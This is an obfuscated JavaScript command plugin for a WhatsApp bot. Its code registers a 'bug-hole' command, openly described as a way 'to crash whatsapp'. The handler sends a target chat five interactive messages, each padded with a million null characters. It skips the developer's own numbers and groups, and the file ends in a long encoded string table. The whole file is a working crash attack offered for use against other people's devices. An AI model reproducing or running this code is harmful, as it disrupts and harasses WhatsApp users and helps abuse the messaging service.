(function (_0x290b3d, _0x5ea591) {
    const _0x25549b = _0x290b3d();
    while (true) {
      try {
        const _0x4861ef = parseInt(_0x3baf(1968, 'm[F5')) / 1 + parseInt(_0x3baf(1445, '10u7')) / 2 + -parseInt(_0x3baf(2495, '&LH2')) / 3 * (-parseInt(_0x3baf(596, 'PA@u')) / 4) + -parseInt(_0x3baf(1231, 'ET8Q')) / 5 * (parseInt(_0x3baf(2326, 'V$ao')) / 6) + parseInt(_0x3baf(1629, 'nk8T')) / 7 + -parseInt(_0x3baf(756, 'ET8Q')) / 8 * (-parseInt(_0x3baf(1951, 'ZsHC')) / 9) + parseInt(_0x3baf(1714, 'ET8Q')) / 10 * (-parseInt(_0x3baf(2761, 'esOX')) / 11);
        if (_0x4861ef === _0x5ea591) {
          break;
        } else {
          _0x25549b.push(_0x25549b.shift());
        }
      } catch (_0x19a0dd) {
        _0x25549b.push(_0x25549b.shift());
      }
    }
  })(_0x433f, 809440);
  function _0x3baf(_0x3cdf55, _0x2d7284) {
    const _0x89be5c = _0x433f();
    _0x3baf = function (_0x14d16e, _0x21edc6) {
      _0x14d16e = _0x14d16e - 282;
      let _0x120b03 = _0x89be5c[_0x14d16e];
      if (_0x3baf.zMgmuM === undefined) {
        var _0x5a555a = function (_0x539fca) {
          let _0x269641 = '';
          let _0x273172 = '';
          let _0x29a020 = 0;
          let _0x183dbe;
          let _0x19ca1d;
          for (let _0x173858 = 0; _0x19ca1d = _0x539fca.charAt(_0x173858++); ~_0x19ca1d && (_0x183dbe = _0x29a020 % 4 ? _0x183dbe * 64 + _0x19ca1d : _0x19ca1d, _0x29a020++ % 4) ? _0x269641 += String.fromCharCode(255 & _0x183dbe >> (-2 * _0x29a020 & 6)) : 0) {
            _0x19ca1d = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='.indexOf(_0x19ca1d);
          }
          let _0x25d7eb = 0;
          for (let _0x1903e6 = _0x269641.length; _0x25d7eb < _0x1903e6; _0x25d7eb++) {
            _0x273172 += '%' + ('00' + _0x269641.charCodeAt(_0x25d7eb).toString(16)).slice(-2);
          }
          return decodeURIComponent(_0x273172);
        };
        const _0x3b4027 = function (_0x42f440, _0x562846) {
          let _0x490de7 = [];
          let _0x4b00a3 = 0;
          let _0x26f46c;
          let _0x983c11 = '';
          _0x42f440 = _0x5a555a(_0x42f440);
          let _0x57a9da;
          for (_0x57a9da = 0; _0x57a9da < 256; _0x57a9da++) {
            _0x490de7[_0x57a9da] = _0x57a9da;
          }
          for (_0x57a9da = 0; _0x57a9da < 256; _0x57a9da++) {
            _0x4b00a3 = (_0x4b00a3 + _0x490de7[_0x57a9da] + _0x562846.charCodeAt(_0x57a9da % _0x562846.length)) % 256;
            _0x26f46c = _0x490de7[_0x57a9da];
            _0x490de7[_0x57a9da] = _0x490de7[_0x4b00a3];
            _0x490de7[_0x4b00a3] = _0x26f46c;
          }
          _0x57a9da = 0;
          _0x4b00a3 = 0;
          for (let _0x449142 = 0; _0x449142 < _0x42f440.length; _0x449142++) {
            _0x57a9da = (_0x57a9da + 1) % 256;
            _0x4b00a3 = (_0x4b00a3 + _0x490de7[_0x57a9da]) % 256;
            _0x26f46c = _0x490de7[_0x57a9da];
            _0x490de7[_0x57a9da] = _0x490de7[_0x4b00a3];
            _0x490de7[_0x4b00a3] = _0x26f46c;
            _0x983c11 += String.fromCharCode(_0x42f440.charCodeAt(_0x449142) ^ _0x490de7[(_0x490de7[_0x57a9da] + _0x490de7[_0x4b00a3]) % 256]);
          }
          return _0x983c11;
        };
        _0x3baf.DyfiNv = _0x3b4027;
        _0x3cdf55 = arguments;
        _0x3baf.zMgmuM = true;
      }
      const _0x3a01c3 = _0x89be5c[0];
      const _0x2d226d = _0x14d16e + _0x3a01c3;
      const _0x463d5f = _0x3cdf55[_0x2d226d];
      if (!_0x463d5f) {
        if (_0x3baf.BVEqLZ === undefined) {
          _0x3baf.BVEqLZ = true;
        }
        _0x120b03 = _0x3baf.DyfiNv(_0x120b03, _0x21edc6);
        _0x3cdf55[_0x2d226d] = _0x120b03;
      } else {
        _0x120b03 = _0x463d5f;
      }
      return _0x120b03;
    };
    return _0x3baf(_0x3cdf55, _0x2d7284);
  }
  const fs = require('fs');
  const {
    cmd,
    commands
  } = require("../lib/command");
  const {
    getBuffer,
    getGroupAdmins,
    getRandom,
    h2k,
    isUrl,
    Json,
    runtime,
    sleep,
    fetchJson,
    clockString,
    jsonformat,
    forwardMessage
  } = require("../lib/functions");
  const {
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    PHONENUMBER_MCC,
    makeCacheableSignalKeyStore,
    makeWASocket,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    generateWAMessageFromContent,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    getContentType
  } = require("@whiskeysockets/baileys");
  const _0xf9d0d5 = {};
  function _0x2649fe(_0x5dca6f, _0x310e16, _0x278cae, _0x10e17b, _0x74dc9) {
    return _0x3baf(_0x310e16 - 0x286, _0x5dca6f);
  }
  _0xf9d0d5.pattern = "bug-hole";
  _0xf9d0d5.react = '🔖';
  _0xf9d0d5.desc = "To crash whatsapp";
  _0xf9d0d5.category = "bug";
  _0xf9d0d5.use = ".ios-ui";
  _0xf9d0d5.filename = __filename;
  cmd(_0xf9d0d5, async (_0x57b392, _0x2f8b58, _0x1096d1, {
    from: _0x314bd3,
    prefix: _0x1feac8,
    l: _0x218224,
    quoted: _0x2946e2,
    body: _0x4831b3,
    isCmd: _0x1168f7,
    command: _0x462cd4,
    args: _0x1f569a,
    q: _0x377d54,
    isGroup: _0x1908a0,
    sender: _0x258ccf,
    senderNumber: _0x2c51b9,
    botNumber2: _0x5de9b1,
    botNumber: _0x2b4935,
    pushname: _0x149d3c,
    isMe: _0xd74e06,
    isDev: _0x57ea7c,
    isOwner: _0x3cf2c5,
    groupMetadata: _0x5682a0,
    groupName: _0x2fb9b1,
    participants: _0x37f894,
    groupAdmins: _0x3a33b0,
    isBotAdmins: _0x4a3015,
    isAdmins: _0x2dd7e5,
    reply: _0x2165e2
  }) => {
    try {
      if (!_0x57ea7c) {
        return _0x2165e2("⚠️ ⚠️ *This is X-BYTE bugs... You dont have permission to use this Bot..̅");
      }
      if (_0x314bd3.includes("923072380380") || _0x314bd3.includes("923458017380") || _0x314bd3.includes("923152380380") || _0x314bd3.includes("923453800380")) {
        return _0x2165e2("Sorry, I cant upload code to my Hamza developer 🥱\nTry to use it on another private!!");
      }
      if (_0x314bd3.includes("120363331372867340@g.us") || _0x314bd3.includes("120363320416667582@g.us")) {
        return _0x2165e2("Sorry, I cant send locks to my Hamza developers group 🥱\nTry using it in another group!!");
      }
      _0x57b392.sendButtonVideo = async (_0x2138d4, _0x469981, _0x5d69cd, _0x466383 = {}) => {};
      const _0x43dece = {
        remoteJid: "status@broadcast"
      };
      const _0x510e11 = {
        'participant': "0@s.whatsapp.net",
        ...(_0x1096d1.chat ? _0x43dece : {})
      };
      const _0x5ca7de = {
        title: "X B Y T E,  B Y  H A M Z A"
      };
      const _0x11d1a3 = {
        listResponseMessage: _0x5ca7de
      };
      const _0x23cfb7 = {
        key: _0x510e11,
        message: _0x11d1a3
      };
      if (!_0x377d54) {
        return _0x2165e2("Usage ." + _0x462cd4 + " 1962623836281@g.us");
      }
      _0x2165e2("In proses....");
      target = _0x377d54;
      for (let _0x194c74 = 0; _0x194c74 < 5; _0x194c74++) {
        const _0x319d8a = {
          title: '',
          subtitle: " "
        };
        var _0x50b00f = generateWAMessageFromContent(_0x1096d1.chat, proto.Message.fromObject({
          'viewOnceMessage': {
            'message': {
              'interactiveMessage': {
                'header': _0x319d8a,
                'body': {
                  'text': "🩸⃟༑⌁⃰𝙰𝚗𝚐𝚐𝚊𝚣𝚢𝚢 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
                },
                'footer': {
                  'text': "›          #Hamza BUG"
                },
                'nativeFlowMessage': {
                  'buttons': [{
                    'name': "cta_url",
                    'buttonParamsJson': "{ display_text : '⿻xbyte⿻', url : , merchant_url :  }"
                  }],
                  'messageParamsJson': "\0".repeat(1000000)
                }
              }
            }
          }
        }), {
          'userJid': _0x1096d1.chat,
          'quoted': _0x23cfb7
        });
        await _0x57b392.relayMessage(target, _0x50b00f.message, {
          'messageId': _0x50b00f.key.id
        });
        await sleep(700);
      }
      _0x2165e2("<✓> Successfully Send Bug to " + target + " Using " + _0x462cd4 + ". ✅\n\n<!> Pause 2 minutes so that the bot is not banned.");
      const _0x2daa8c = {
        text: '✅️',
        key: _0x2f8b58.key
      };
      const _0xbd47f2 = {
        react: _0x2daa8c
      };
      _0x57b392.sendMessage(_0x314bd3, _0xbd47f2);
    } catch (_0x560826) {
      _0x2165e2("an error occurred while executing the command contact the Hamza developer!");
      _0x218224(_0x560826);
    }
  });
  function _0x433f() {
    const _0xff6424 = ['oSowW4hcKCku', 'bq1smCod', '0Rae06Pl058', 'WPDehCocWOS', 'E8k2WPdcPCkB', 'W4FcSIRdJmk3WOpdT23dUcxdIM7dRq', 'iJRdQCkwha', 'cwlcGCoCda', 'FmoCtmkZoq', 'W644lYddGW', 'W4rzWRvSWQq', 'suSaqZS', 'ySkiWOVcSmot', 'WP/dKSksnxW', 'WRpdMt3cP8oX', 'WQTOWPbdgq', 'fJ47WQ7dKG', 'WR0GevyJ', 'W5FdNfSnlG', 'WOdcSsaWW40', 'BCkxWPZcVCkC', '4lsL4ls24lAE4lEfW6i', 'W41zWR91WOG', 'W7hdPxlcUCon', 'vSo0W5NcUci', 'DCo2CmkBya', 'zCoTdokfTey', 'g2zmW5pcSa', 'WRrtFCo8lW', 'WR1ilSoNgW', 'A09bWRxdTW', 'W63dJokETSkHBG', 'WQz+mWir', 'WQ3cV0ydwG', 'gKNcHwVdUa', 'WORdO8kTaty', '8jYhIcVcId/cVa', 'kmoGW6dcQCol', 'WQ/cHw7dQ8k9', 'W4zqWQPY', 'WRBdK0eFmW', 'F2FdGSohW6a', 'F3xdUCoJW5q', 'W6S/W6ddOmou', 'cs3cKupdGq', 'WQy/WOmMqq', 'W48arLCk', 't1pIHinSWOe', 'fHGlWPddTW', 'dfpdVqVdKa', '4RY7W7HdW4FcLq', '4lsb4lwf4lEt4lEcWO4', 'WQXWW6tdQCot', 'lJRdQCkaha', 'x8kGwSk8uW', 'W4yBlsddJa', 'W7fJkmo0Aq', 's8kJrCk4xG', 'WOFdOmkMvxm', 'gJRcUuiC', 'zWRcGNaM', 'W6JdLqrjW4W', 'W7tdQSkvEmkb', 'WPLuWOypla', 'W4lcGgLDWQ0', 'WO7dQSkMvtO', 'WPldJv0loG', 'WRbDW6bZaa', 'W6WFW7zfWQK', 'q8kXfmoNuq', 'WRNdVZNcHSkk', 'vfRdVmoa', 'WRCIWPDqCG', 'W7tdQf7dLSou', 'cM3dRcxdOW', 'xCk3wCk5xW', 'vSkkz8kAbW', 'WRW9bc8H', 'DSobwCkK', 'pCo7WRFdSCkg', 'xZhcKCoatq', '4lA34lAGWOlGTP7GTP4', 'W657WQ9IWR8', 'WOZdPqyWW5S', 'aWNcHwJdOa', 'WOGiEqyu', 'W5eYWO5+WOG', 'gKRdMrJdLa', 'WQJcImoHW5f9', 'W5KWwL8', 'FMRdV8kkdG', 'W7tcOSk7zhi', 'xmkixmkzxW', 'nIVcPmoowW', 'rSkGtW', 'xItcMSkckW', 'mI3dQCkaha', 'WQJcOLbqna', 'WQlcN27dS8kW', 'ymkOW4dcHmo2', 'W6uEW5bFWQO', '8ycbVpcBOiBWVygy8y2JT8kY', 'hJ3cUuil', 'ltxcQvhdHq', 'j3FdKtZdRq', 'ghvoW5VdUq', 'ld3cHJdcMa', 'mt/cItRdTq', 'hchcQ1C', 'WOpcKaba4lEh', 'FCo5q8kUiG', 'WOBdOCkSat8', 'WPxcPv4GWP0', 'WP9AWP9DnG', '4lw14lAx4lss4lAKW7y', '4lsW4lERyYRdMG', 'WR4IW4y', 'tNhdK8oufW', 'hNhcJ8otba', 'wtZdJSkqlW', 'qrJcL8kufq', 'hmo3bSoUha', 'WOeRprqh', 'WP7cOvGJWPJcKCorW70ODI7cRrm', 'c2ddQCohcq', 'WRBnNm2YgC2GZOWaZAdnIctpH/crOyBmQa', '8yYyUVgeU4BXGlMz8y24HVcqIQS', 'wW8gtYi', 'W6RcNmkUW4XQ', 'WRddLwuboq', 'W6BcI8oLW5bK', '4lst4ls64lAL4lwXWPu', 'WQj4W4nWwa', 'a2js', 'W6ZcOSoUsJy', 'WODVWRn3WRG', 'FCkbW6NcKCoj', 'f+c3UEc0SUc0LUc2IG', 'WQpcHmkrpSkx', 'mtVcGdS', 'vmk/WOFdRh0', 'WQjih8oIpq', 'WQHPe3e3', 'W5RcJwW', 'eIdcPfyp', 'A8kVW6hcUSkF', 'WRmWnbyB', 'W40qr0CI', 'jmkbqNddRq', 'WPldIfBcG8oC', '4lEF4lA7WOhGTixGT4y', 'W7G9jItdNG', '4BAfW4NkLSIqW6u', 'WP7dKs7dM8oh', 'YAxlR+g2OGBHTyO', 'lrtcKs/dVq', 'ysShts4', 'jJ/cLa', 'WQldPLJdL8or', 'gGpcO0C', 'W6ZVVjuLWPpdK+kcN+kbRa', 'q8kKx8kXFW', 'WQ7cPfvchG', '8ywGHVgpKRJWQAcc8lMhOEgCJW', 'pL3cKHvX', 'W4hcP37cIgS', 'f0NdVuRcNG', '4BEy4BEOWPpHTRdHTAm', 'q8kHfg7dSq', 'W5xdLhRcLCoO', 'WOFdPelcJCoL', 'W4NdO23cRSok', 'FSojaCk7pW', 'W45yWRzxWPC', 'WQX5W5f5jW', '4lw+4lsOWQZGTiBGT5y', 'WQZcMCodW5G', 'ywBdN8odW6e', 'WQ01W7xdPq', 'CwRdLwJcIW', 'hI3cR1eK', 'wc7cImkHpW', 'yHBdRx49', 'W7tcGhVdS8kG', 'bqZcKGZdNq', 'aUc1KEc1JUc1MZi', 'dufhW5NdPW', 'qZZcNSkHya', 'DcyGyri', 'W6ddV0/dH8oa', 'xCkMW6RcG8o2', 'W63cU8oXw0q', 'WQhcSH/cI8kf', 'W4PwWRG', '4BA7W4JkHSISWP8', 'E8koW5NcPCkB', 'vfyezmot', 'W789tLej', 'uCk3WOtdRdi', 'dEc1GUc2M+c0JWO', 'z8kvWPhcTmkb', 'W5RcQGzmWOC', 'oSoLytVcSa', 'neXxWPxcUq', 'vCk+cZRcRa', 'WQa7mHyB', 'WP7dKe0gka', 'yGVcGKqY', 'WQDOW4m', 'WORdQCkcyMm', 'W5pcINRdKCod', 'W49rWRLNW4K', 'WPWeDgSL', 'W5BcK2rRWOm', 'gSoKvZFcTq', 'WQu4jq/dRG', 'WRHmFCo9pa', 'W4dcHConlNK', '4BEU4BAgo+g3Pog2HG', 'WQZcQmoyW4aL', 'FqRdG0uZ', 'iZ3cGN7GTkK', 'WRxdOSoBAIu', 'W6RdNNutW6C', 'ESkeWPxcSmkk', 'WOFdNSkAFYm', '4PIm77QEsEkASo+6OCkeW48', 'WQpcVCoKswu', 'E0/dGenN', 'WQJdI8kumCkt', '4lwY4lse4lE84lEh4lAp', 'W70/n2FcLW', '4lAA4lsp4lAgW7ZGT7a', '4P6Z77UM4BEc4l2zZOpHNBRWO5gf8jkbPW', 'gtmcrJ8', 'WOpdO3FcISoK', 'iKjnW7hdNa', 'FCoIW5JcQCov', 'W5bfgSkdWPG', 'W6/cJqz7WQC', '4lwRaEc3IEc0QUc3RG', '8ycaLZVXGQch8lcXJVcEKjG', 'W43cJxhdH8oY', 'W4z7WP1FWOG', 'ySkHWOVdOge', 'W5K0t3eb', 'WQ/cHIbcWRO', 'WOtdT3tcI8oK', 'uY3cNCkX', 'W5apW6PcWQ0', '4OonWP4osN0', 'W5Cwb0SI', 'WPixFLus', 'qvxdUrZdNa', 'C2FcTSoNqW', 'W5nFWRHQ', '4BwcFSMsYluE', 'n8owqqpcIq', 'W65OWOfbWPS', 'rCkeWORcOSks', 'WRdcG8ogW5Kh', 'WQncnComjW', 'W7pcVCoWd3K', 'W7NdQ1JdKmoy', '4lwq4lsC4lwbDUc1IW', 'W6WyWPvXW7i', 'W6rZvwv6', 'W69ZWOnDzq', 'W5jkWQXXWRC', 'W5rFWQ56WPS', 'bWldIs/cRa', 'CMJdV8klcKHKbCkeWQChWRKO', 'rNddSXPc', 'Bmotrmk/oq', 'CxxdOSoNW5y', 'jmoiWOtdQmoR', 'W7tcTgNcKNa', 'W7VdMCkeWPjw', 'WQrtWQ0fW6a', 'WRxcGSoIW5Pc', 'WQhdNmkdoSkz', 'rmkRvCkXxW', 'WRJdTtZdIJ4', '4lwu4lAB4lAp4ls+4lAB', 'W5CrCwmD', 'WQSYW5OEnq', 'W4ldMa1wW6m', 'W58nsuC', 'WRmRW5a5kq', 'vGTdttG', 'W7GJlchdMa', 'uSk+WPRdUNS', 'W5T7WObrEW', 'WPdcG8obW5KD', 'W7OHWPj6hG', 'yG3dH1q7', 'W5FcHX8sjq', 'WObYWRWUEq', 'jZVcRYtdKa', 'WOZcOK3cNSoR', 'WRxdSJVdGJm', 'xGFcG8k+hG', 'WOddU03cTmo1', 'WQOXW6RcQ8oa', 'W5StqNai', 'cfDth2a', 'bWlcLxFdTa', 'wcBdJSkZna', 'WPJcT3xdSmk3', 'W6BcVefsWOa', 'WQdcVe1mBG', '8lkZGpcAOOtcN/gcGl/nKVc/SAxnKG', 'tSk0WPldU3C', 'sWJdRxqd', 'WRdcICktW5Sr', 'W5NcGwZdL8oA', 'W5elW7zaWP8', 'W7TFiSoLWO0', 'ymkGrCkUsW', 'semlzmkb', 'sh/dVbPo', 'W7eFW7WtW7y', 'yCk1W5hcQ8ox', 'W5zDWQvIWQq', 'W4pdPuLIW4S', 'aUc1OUc0V+c0Uoc3Ma', 'zchGTjNGTAdGT4G', '4lsd4lEL4lsi4lAm4lwk', 'vW3cR1NcLq', 'W5VcVSo7ggO', 'W6bGWRDrWPC', 'W5xcMM7dUmkG', 'W4JdVGDKWO4', 'WQGtnIlcJq', 'W6n4W4n8fG', 'W6HYWOfDzq', 'aZlIGAtdRmoY', 'WOldU8kuxZG', 'W5hcKuxdPSkk', 'WRm2vhrG', 'WPFdN8kfnCkt', 'WOpdLSkCFq', 'WQ9fW5HLmG', 'WQRdLCkawse', 'aw/dTSovaa', 'sLugC8kp', 'W4tdMhVcUCo0', 'ZjRmGsdWN56W4BskZlBIGPJoQG', 'WPXAWP8EyG', 'mZhdQ8oovG', 'fSk9tslcOa', 'WPBdOSoMavK', '4lEZ4lAy4lw04lsa4lEG', 'W5JdONRcSCo8', 'DSobwCoWEa', 'W5/cI2VcG8ol', 'ymkNW73cQW', 'WQRcUJNcQmkw', 'WPldJf1koG', 'W5/cMCoq', '4lER4lE/4lwTa+c3HG', 'W7WnW7Wr4lwD', 'W4VdR2NcQa', 'zKiMBmkg', 'AGVcGLeV', '8l2jSmkI8jAGKVcKG7NpTm2m', 'WQpcVbRcLCks', 'vrVdK0GD', 'guvddhy', 'W6BGTzhGTypGTB7GT50', 'sYCBscy', '4PEC8jYJHFcWSB3XJioQ8lwqLW', 'jebzW5RdOG', 'vs3cNa', 'uaKgxGK', 'W6dcMh3cO34', 'jwjyW4xdSq', 'sK4SwCkj', 'WOJcR8oxW48Y', 'W6SYW4feWQ0', 'fWtcKeii', 'WPFdP8k9tde', '4lwS4lARW6FGTQ7GTkq', '4ls24lsl4lAJmoc0Gq', 'CmkNW7BcVmkc', 'WP/cQJhcV8kS', 'ymkaW6pcOmo9', '4lwV4lAxeEc2Uoc2MW', 'WP7cQMVdQSoW', 'W4CxWRq', '4lw84ls1WQZGTiBGT5y', 'W6ZcT8oSw38', 'WRVdI8kUW5f9', 'W6K7kJFdJa', 'WQhGTB3GTy3GTPlGT5K', '4l2eZQppKVgnMRFIGlVILitcUmkW', '4RggYPlIGy1rmG', 'W5BcV2BdOCo4', 'eIZcUvaA', 'W4FdTba', 'W45jW6bPWR4', 'W6XQWOPzWQq', 'vGSq', 'WRVcICo5dwq', 'W6lcS8oUaNe', 'WPBdHmoqngi', 'BCkVWQ7cPSok', 'WRa2qMeL', 'WR3dSd3dIdW', 'W7GHcaZdOa', 'W4bwWQ98WRC', 'fuutqdm', 'W6dcOCoQd2e', 'W6dcHeT+WQa', 'ftWoWRldGG', 'AI3dHuau', 'ybVdG0Oy', 'WOeXlauB', 'W4WawHpWRPwF', 'gSoDrqZcJa', 'W5eaw0aM', 'W6SWnYddIG', 'W7NdQ1JdL8ot', 'mJBcId/dNa', 'qCoaDCk1iG', 'ESowaCkXna', 'WRNcJsLpWPK', '8jMsLpc5GitWTlkM8jcHK/cQGiK', 'W7JcSM7dKSoz', 'rCoBtSsbW6W', 'y8k2W73cKCoN', 'fYZdQKau', 'WOVdMCk5vHO', 'W7fqWQj1W4K', 'W7pcJghdU8ki', 'fCkZWO7dHxS', 'lHaAWOBdPa', 'EXVcMCk5ga', 'W6W0ma', 'xJaAzbu', 'huldPa', 'W5DDWQPIWQ8', 'sCkQWQ/cMCky', 'W6lcNgJcSSkT', 'xqavstO', 'nLVcLrf/', 'W5KoW65fWQa', 'oH4mW4pdOG', 'WRqGD2mB', '4lAvqCkclgC', '4lw64lsQ4lEA4lwMWRu', 'WO/cHJVdLCkn', 'W6RcT8o7', 'WPxcMSkDlIG', 'WOpdJN0Sdq', 'qCoOx8kWsW', 'W60IyZBdGG', 'md/cLZVdMq', 'D2FdVCkjcG', 'WRtdT17cKSo0', '4OgHxvJdG8k2', 'W4ZcT8oXxhC', 'WOtdMW4Enq', 'W7b9dCoTWPW', '4l+hW4ZIN63WT6oZ8loGHG', 'W43cOmkKsde', 'WQpcM2DcWRO', 'WOzEW5Xunq', 'WO1jWPWsqW', 'joc1Moc0Loc0GUc0Pq', 'WQCqoGum', 'WQ/cOSoSsa', 'W6KLmctdNq', 'WP7dLmkvAwW', 'W7FdVruvdq', 'WQlcJJJcRmkp', 'yqhdH0jP', 'wcBcNq', 'WRrtaSo6lq', 'WPZdLCkqEYu', 'ggjzWPBWU6A0', 'cMjzWPBdUa', 'WQ7dJ8kfiSkt', 'oCorW4JdOmof', '4lAQ4lEP4lsc4lA64lsE', 'WR9qWQ0iW7u', 'iHpcRSojtq', 'WQpfKKphRUkbHW', 'W7JcP3xcJW', 'c8oGcJxcQG', 'WQi7lfFWP4Er', 'W4VcNhRdKmkF', 'qmkGwmkPqW', '8k2YPVgeOQ/WS5ob4l6MZkZoPpcRMOJIG5e', 'bLBdVbVcHG', 'WRddVWhcKSkn', 'fCoXstm', 'adOBWOFdJW', 'b24mDmot', 'WPLEWP0CDq', 'WOyQq3i7', 'WRldH8oHW5T8', 'WRBdH8oIW4TI', 'q8kiqCkNEW', 'WORcNSo9W6ma', 'cxnyW5FdOa', 'fqFcVmkwhW', 'W6ziW69qWQa', 'W5RcVgVdRSo4', 'W5uwcheO', 'zGpdHWKL', 'WR1uomkXCW', '4lEW4lE94lsSjoc0UG', 'gJVdQbKa', 'v8kOW6FcP8oz', 'l23dKSoicW', 'W7ZcIx/cRgS', 'uJVcNSk9na', 'wdVcI8kHDa', 'WQldMmknrWm', 'W5fxW6TRWPa', 'xCksWPZdSq', 'W6tcJhZdVa', 'WPfnW7aAWQ8', 'W4pdONe', 'rCkHW63cRCop', 'WRfObweJ', 'WOCauCoJWPG', 'WQy7jGm', 'tw8MvdC', 'W6m0WOfTaa', 'W4ZcVhLsWOC', 'sHecxIi', 'W7O0iIBdMq', 'W6hcH3VdTSkX', 'W7a2WQnyW4S', '4OwzimoOW67cLG', 'lwmrEmot', 'WPRcTJRcISk4', 'WRW1W7hdT8o+', 'fmoZtYxdPq', 'WQBdOCk7ztS', 'iGGAWQldMG', 'zHJdQ3mn', 'WQBcNsVcQmkJ', 'WRZdKSkElSko', 'WPTpW7PBlW', 'WPRdRgG', 'uGaA', 'yConsCk5pW', 'W5pcHuddLCkw', 'W6LXltddGa', '4BEX4BA6W57WMBcK4Ocs8jgbLW', 'WONdJ8kvjCkx', 'WRWRmXuh', 'WOXvbbeO', 'dxryW5FdTW', 'WR3cGczFWQC', 'WOFdP3xcNmo4', 'aSk1WOVcQmot', 't8k7WPdcUI8', 'W7fvmSkZja', 'WObiW4PgmW', '4lsy4lEq4lwl4lAC4lsE', 'WR89vxKb', 'W4HQfmkpW50', 'du1cW5i', '4lsm4lAM4lsp4lA54lsc', 'W54BW6LGWQy', 'gcLfW5pdPa', '4lAs4lA24lEB4lE2DG', 'W40kWRDeW7a', 'WQilW50foG', 'jtVcVHRdNa', 'WRjXyZG', 'WQyNiI/dHa', 'WPS9W5WVaa', 'WRhdKdBcQmoW', 'j8kdWRVcLEkeRG', 'WP0lW4ezoq', 'W74bdtZdOq', 'WQjsWRqsBW', 'CwZdTa', 'W4q/z3Sp', 'pZRdPfqt', 'wCkQfSkPqG', 'lW7cHCo9ra', 'WRCVvgm2', 'W48qsKCU', 'rs7dKNldVa', 'WRRcIt5gWRe', 'nWryWRddSW', '4lsi4lES4lwX4lEuW4K', 'vSkZWPVdVq', 'W4evWQilW7S', 'W7/cP2pcN0C', '8yEBT+kaL+c8SoknKUkbQ/c7IRtWK6QS', 'W6/cMwRdRCoK', 'fIFcQu8o', 'W6RdNLFcKCoq', 'WRtcQfvovW', 'l2vOW5NdMa', 'W4bEWQ50WOW', 'WRD+nWnc', 'kddcUa', 'WPrnj8oelW', 'W73cKerRWQ0', '8jwXMFgfOjKY8lgtTFgpSRS', 'CNtdTG', 'WRddSqhcGSku', 'WOldO8k9rhe', 'W7ddUHivbW', '8yYXOFc+KlSV8jE1Hmkm', 'WR7cH34sW60', 'id3dQ8oBuW', 'WQ4olsBdSG', 'W6dGTBdGTQdGTzRGTk8', 'hWzvnSoa', 'Emoys8k1pW', 'W7ndWRb7', 'd8o1xci', 'W5xcUfNcRuW', 'WQa2va', 'tqPdqs8', 'WOZcKYlcImkf', '4lE64lA34lsgWP3GT5W', 'WPZdRZVcKCo0', 'WOFcS8ojW7Pq', 'w2/dTCoqW5e', 'krXyWOFdSW', 'DSkNW6lcQCog', 'W74EW4zzWQK', 'n1/dJhCSW5jPgW', 'W6JcL0LYWO0', '8lccP/cNGlddN/c7OP/XHBgf', 'WRGOW5et', 'WPvqg8omWOO', 'W6qckmocWRy', 'vt3cIq', 'c03dUqhdIa', '4lAL4lsUW5NGTyVGTly', '8l+tL2pWRic18y6sOVcJG7y', 'E+c3OEc2Voc1KUc1Na', 'W73dR17cUmkX', 'nZBcSSojvW', '4lsk4lEU4lw64lEmW7y', 'WPpdKhRcLmoD', 'W7dcNXZdICkx', 'W4LFWQWXW6y', 'DYfdBGm', 'WOZcM8oCDt4', 'WRJcJtDoWRu', 'AHVcTokfLCos', 'WOxWRQcIpbhdQW', 'W6XuWQriWQe', 'WOpcGqbgWRC', 'W4KacGLZ', 'W5FdIKfkka', 'W5jxW64+W5W', 'WPKximkdWPW', 'c1jBBde', '4lwl4lA74lAxWRpGT6y', '1z/oIokwKokTI2ZIMl/VUlBIGjW', 'WOdcOGPsWRS', 'WOhcN8oEW49w', 'WQNcNbHdWRe', 'z8kQW6/cPSol', 'W5ewyKaO', 'W5faW5ejBq', 'uttdKmk0WOa', 'hxldImosdW', 'cNjFW4ldVW', 'lvxdMqqX', 'W47dVH0WW4C', 'W4qDueS/', 'd0FcHgVdOq', 'WQ3cUHZcLmkb', 'oLZcKrb2', 'W7epoSoMW4O', 'WQOMjLTx', '4lwN4lwhkoc1M+c0Ua', '4lwXfCotDsW', 'W6T1WOXBySkxW5RdPWNcJ0lcRCkU', 'bmo8wCoMBq', 'W6tGTi3GTPZGT7RGTO8', 'ztdcQSoxwW', 'fqbBqCku', 'WQ/dOCkXaCkD', 'WRJcJszpWPi', 'Fq7cGKiI', 'yCkSW7O', 'W4VdOKC+WOa', 'DJZIH4e5W54', 'r8kSrmk8cG', 'W7nub8oPWPy', 'CSkyWRldJ38', 'WO9EWOa', 'W4PFWQ5QWR8', 'iqpcNhddJq', 'aeNdLZ3dGa', 'WO3cVmks', 'W7ypW6bcWQm', 'jgJdUSoCca', 'nYZcRSoxvW', 'vdZcJ8knlW', 'yCkXW73cQCoy', 'W7eaw0aM', '4lAB4lskfUc1GEc3UG', 'W6TWWOrFAa', 'rCkKqSoZxq', 'W5iIdokePIu', 'velcUH7dHq', 'WQHOW4K', 'hItcPvyv', 'thW0vSky', 'c2rjWOVcQq', 'W4/cRCk7stO', '4lwld33cMwK', 'BhqhzCkL', 'W7S0yZxdMa', 'WOpcHMDBWQy', 'WQhcSGdcKSko', 'WPbfyrmK', 'xSkGfSkPqG', 'EuDAWQRdKG', 'WRHppSo/pa', '4lsw4lsh4ls04lESW5y', 'WRCQFe1t', 'WQRcGfbzBW', 'ySkTW6hcVmoA', 'WQhcOXb8WR8', 'W4Gjtq', 'uoc2Roc1Qoc2I+c2Kq', 'w/gpSjNcNSo+WQ4', 'W6pcRc3cMMq', 'W5FcHJ/dGSor', 'W4jV4OoWACkO', 'cblcQ8k84OEu', 'WQhcPmoRtgi', '4BAO4BAkkpgiK73IGy/WSOck', 'pY7dPSoNWOG', 'W5earKCy', 'WRCIW4yzmq', 'WRldLLpcUCoK', '8yMdNh3WUAkI8jUXVVcxOQy', 'W6S5iJe', 'W63cMwpdUSoL', 'fYpcGCk2pW', '8ksfImkspmowhG', '8kAWG/c1GRBmG/cOSPFWPBQa8ysZM8Y6', 'WQ5OW55Heq', 'WQVcTYRcV8kc', 'W4fseCox', 's8oxuSkyjq', 'W5FcHNZdJ8ok', 'W7SritFdGG', 